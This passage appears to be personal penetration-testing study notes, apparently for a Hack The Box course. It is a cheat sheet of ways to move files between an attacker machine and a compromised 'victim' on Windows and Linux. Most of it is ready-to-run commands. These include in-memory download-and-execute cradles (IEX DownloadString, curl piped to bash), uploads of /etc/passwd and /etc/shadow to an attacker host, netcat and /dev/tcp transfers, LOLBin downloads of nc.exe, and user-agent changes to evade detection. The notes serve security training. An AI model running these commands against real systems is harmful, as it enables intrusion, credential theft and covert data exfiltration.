  # Powershell 3 and later you can use Invoke-WebRequest (Alias: curl, iwr, wget)
  Invoke-WebRequest [web exe] -OutFile fileName

  # Further Powershell Download Cradles 
  https://gist.github.com/HarmJ0y/bb48307ffa663256e239


# Powershell Common Problems 
  1. IE first-launch: 
    -UseBasicPasring
    Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

  2. "Could not establish trust relationship for the SSL/TLS secure channel"
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}


# SMB 
  1. Setup SMB servAer on attack box using smbserver.py
    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

  2. Mount the share using the creds
    net use n: \\[ip]\share /user:test test


# FTP (Using pyftpdlib)
  1. Start python program and specify port you want to use 
    sudo python3 -m pyftpdlib --port [port typically 21 or 20]

  2. From the victim machine 
    (New-Object Net.WebClient).DownloadFile('ftp://[ip]/file.txt', 'C:\Users\Public\file.txt')

  3. If you dont have an interactive shell on victim machine you can create a file that contains ftp commands and pass that file to the ftp command to run
    ftp -v -n -s:file.txt


# Upload from Victim to Attack Machine 
  1. Base64 Encode and decode on Attack Machine 

  2. Python "uploadserver". Can upload files from vicitm machine to it. 
    python3 -m uploadserver
    # Download powershell upload ps1
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
    # Upload file to remote machine 
    PS C:\htb> Invoke-FileUpload -Uri http://[ip]:[server port]/upload -File C:\Windows\System32\drivers\etc\hosts

  3. netcat on attack machine and sent post request from victim 
    nc -lvnp 8000
    # Set var == Data you want to send 
    $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
    Invoke-WebRequest -Uri http://[ip]:8000/ -Method POST -Body $b64
  

# SMB Uploads - Using WebDAV (RFC 4918O 2. curl is the same but its -o not -O)
  SMB will first try to connect to a remote target using SMB, if that fails it will then try using HTTP. We can setup a WebDav server.

  1. Install python wsgidav cheroot

  2. Start wsdigav 
    sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

  3. Connect to share using DavWWWRoot 
    dir \\192.168.49.128\DavWWWRoot

  4. Upload from victim to attack 
    copy C:\local\file \\[attack ip]\DavWWWRoot\


# FTP upload 
  1. Start pyftpdlib - Specify --write for upload 
    sudo python3 -m pyftpdlib --port 21 --write

  2. Upload from Victim 
    (New-Object Net.WebClient).UploadFile('ftp://[ip]/ftp-hosts', 'C:\local\file\')

  3. Use text file with ftp commands (As shown above) if no interactive temrinal
```
<br>

### Linux File Transfer Methods 
```
# Base64 Encode and Decode 
  1. Encode b64
    cat [file want to decode] | base64 -w 0; echo 
  
  2. Copy output, paste into receiving terminal, decode 
    echo -n "b64 output" | base64 -d > fileName 

  3. Note: Check hash of file b4 and after to ensure integrity 


# Web Downloads (wget and curl)
  1. wget 
    wget https://[remote file name] -O outputFileName

  2. curl is the same but its -o not -O


# Fileless web downloads (Run in memory)
  1. Curl 
    curl https://[web download] | bash

  2. wget 
    wget -qO- https://[web download] | python3 


# Download with Bash (/dev/tcp)
  1. Connect to target webserver
    exec 3<>/dev/tcp/[ip]/[port]

  2. Get request 
    echo -e "GET /[file] HTTP/1.1\n\n">&3 

  3. Print Response 
    cat <&3 


# SSH downloads 
  1. Start SSH and check if your pc is listening 
    sudo systemctl start ssh
    netstat -lnpt 

  2. Use SCP to download file to and from 
    scp root@[ip]:/dir/to/file.txt . 
    scp /file/to/download.txt root@[ip]:/location/to/go/to 
```

<br>

### Linux Upload Methods 
```
# Python uploadserver.py
  1. Install uploadserver 
    sudo python3 -m pip install --user uploadserver

  2. Create self-signed cert
    openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

  3. Make new dir
    mkdir https && cd https

  4. Start server
    sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

  5. Upload from victim machine 
    curl -X POST https://[attacker ip]/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure


# Start up Mini webserver 
  1. python3 
    python3 -m http.server

  2. python2.7
    python2.7 -m SimpleHTTPServer

  3. PHP
    php -S 0.0.0.0:8000 

  4. ruby 
    ruby -run -ehttpd . -p8000 

  5. From attacker machine 
    wget [victim ip]:8000/file.txt 
```

<br>

### Transferring Files with Code 
```
# Python 
  1. Python 2
    python2.7 -c 'import urllib;urllib.urlretrieve ("[url]", "LinEnum.sh")'

  2. Python 3 
     python3 -c 'import urllib.request;urllib.request.urlretrieve("[url]", "LinEnum.sh")'


# PHP
  1. File_get_contents()
    php -r '$file = file_get_contents("[url]"); file_put_contents("LinEnum.sh",$file);'

  2. Fopen()
    php -r 'const BUFFER = 1024; $fremote = 
fopen("[url]", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

  3. Fileless
    php -r '$lines = @file("[url]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash


# Ruby 
  ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("[url]")))'


# Perl
  perl -e 'use LWP::Simple; getstore("[url]", "LinEnum.sh");'


# JavaScript 
  1. https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068
    Full Command > cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1


 # VBScript 
  1. https://stackoverflow.com/questions/2973136/download-a-file-with-vbs
    Full Command > cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1


# Python Upload Operation 
  1. Start Py server 
    python3 -m uploadserver

  2. Upload One liner 
    python3 -c 'import requests;requests.post("http://[ip]:[port]/upload",files={"files":open("/etc/passwd","rb")})'
```

<br>

### Miscellaneous File Transfer Methods (Netcat, Ncat, RDP)
```
# Netcat 
  A tool that allows you to read and write from network connections using TCP or UDP. Netcat was made in 1995 but never maintained. Ncat was made in its place to support newer security protocols

# File transfer using ncat and netcat 
  1. On comprimised machine start netcat and have it listen on a port. This command also redirects the standard output to a file. 
    nc -l -p 8000 > file.exe
    Use the flag "--recv-only" if using ncat

  2. From the attack machine we can upload a file using netcat. Specify "-q 0" to tell the program to turn off after the file has been uploaded. We pass the file we want to send into standard in 
    nc -q 0 [ip] [port] < fileToSend.txt
    Use the flag "--send-only" if using ncat 


# Sending to comprimised machine using netcat 
  1. This technique is useful when the comprimsed machine has a firewall that is blocking inbound connecitons. If we can use an open port, we can push data through it. 
    sudo nc -l -p [open port ] -q 0 < fileToSend.exe

  2. On the attack machine, accept the input 
    nc [ip] [port] > nameOfNewFile.exe


# Sending to comprimised machine using ncat 
  sudo ncat -l -p [open port] --send-only < fileToSend.exe 

  ncat [ip] [port] --recv-only > newFileName.exe


# If ncat or netcat are not at our disposal, try using "/dev/TCP"
  1. Send file to comprimised machine 
    sudo nc -l -p 443 -q 0 < fileToSend.exe 

  2. Output tcp into file 
    cat < /dev/tcp/[sender ip]/[port used] > newFileName.exe


# Powershell Session File Transfer (Win RM) (Ports: 5985 & 5986)
  1. Requires the user to have admin access, and be a member of the remote management users 

  2. Test Connection to remote pc 
    Test-NetConnection -ComputerName [remotePC] -Port 5985 

  3. Create Remote Session 
    $Session = New-PSSession -ComputerName [remotePC]

  4. Copy Files 
    Copy-Item -Path C:\[fileToSend.exe] -ToSession $Session -Destination C:\[location]
    Do "-FromSession" if going the other way 


# RDP  (rdesktop and xfreerdp)
  1. Mounting a Linux folder to a remote Machine using rdesktop
    rdesktop [remote ip] -d HTB -u [username] -p [password] -r disk:linux='[dir to files]'

  2. Mounting using xfreerdp 
    xfreerdp /v:[remote ip] /d:HTB /u:[username] /p:[password] /drive:linux,[dir to files]

  3. Access remote share by going to File Explorer > \\tsclient\linux

  4. If you are transferring from Windows to Windows you can use mstsc.exe
```

<br>

### Protected File Transfers 
```
# While transporting sensitive files across the network it would be wise to use some kind of encryptions. But someitmes you dont have that at your dispoal. 

# Solutions - https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
  1. Invoke-AESEncryption.ps1
    Invoke-AESEncryption -Mode Encrypt -Key "password" -Text "Text you want to encrypt"
    Invoke-AESEncryption -Mode Decrypt -Key "password" -Text "Text you want to decrypt" 

    Invoke-AESEncryption -Mode Encrypt -Key "password" -Path "/path/to/file.txt"
    Invoke-AESEncryption -Mode Decrypt -Key "password" -Path "/path/to/file.txt"

  2. Use aformentioned file transfer methods to move this file from host to host. And use the following command to import it.
    Import-Module .\Invoke-AESEncryption

  3. In linux we can use OpenSSL to encrypt 
    openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
    openssl enc -d -iter 100000 -pbkdf2 -in passwd.end -out passwd


```

### Catching files over http (nginx)
```
  1. Create directory that will handle the file uploads 
    sudo mkdir -p /var/www/uploads/SecretUploadDirectory


  2. Change the owner of that dir 
    sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory


  3. Create and popluate nginx config file.
    /etc/nginx/sites-available/upload.conf 
    server {
      listen 9001;
      
      location /SecretUploadDirectory/ {
          root    /var/www/uploads;
          dav_methods PUT;
      }
    }


  4. sym link the dir of the config file to nginx so it knows to use it. If there are other configs in the nginx dir then there will be errors. To avoid this remove any other config files in that dir, and use the diag commands provided below. 
    sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

    sudo systemctl restart nginx.service

    #Diag Commands to narrow down error
    tail -2 /var/log/nginx/error.log
    ss -lnpt | grep [port of hosted nginx]
    ps -ef | grep [pid of above command]


  5. Upload a file to the nginx server 
    curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt

    # verify upload 
    ls /var/www/uploads/SecretUploadDirectory/
```

<br> 

### Living Off the Land 
```
# The term "LOLBins" or "Living Off The Land Binaries" comes from binaries that an attacker can use to perform actions that were not origionally intended. LOLBins are also known as "misplaced trust binaries"
  1. Windows Bins: https://lolbas-project.github.io/#
  2. Unix Bins: https://gtfobins.github.io/

# Bitsadmin Download Function (BITS)
  1. bitsadmin /transfer wcb /priority foreground http://[ip]:[port]/nc.exe C:\Users\htb-student\Desktop\nc.exe

  2. With Powershell
    mport-Module bitstransfer; Start-BitsTransfer -Source "http://[ip]:[port]/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```


<br>

### Detection & Evading Detection 
```
# Explaination of User-Agent String 
  1. https://useragentstring.com/index.php

# Changing User Agent
  1. Invoke-WebRequest can change the user agent 
    #List out User agents 
    [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

  2. Select agent
    $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
    Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

<br>
<br>

## Shells and Payloads
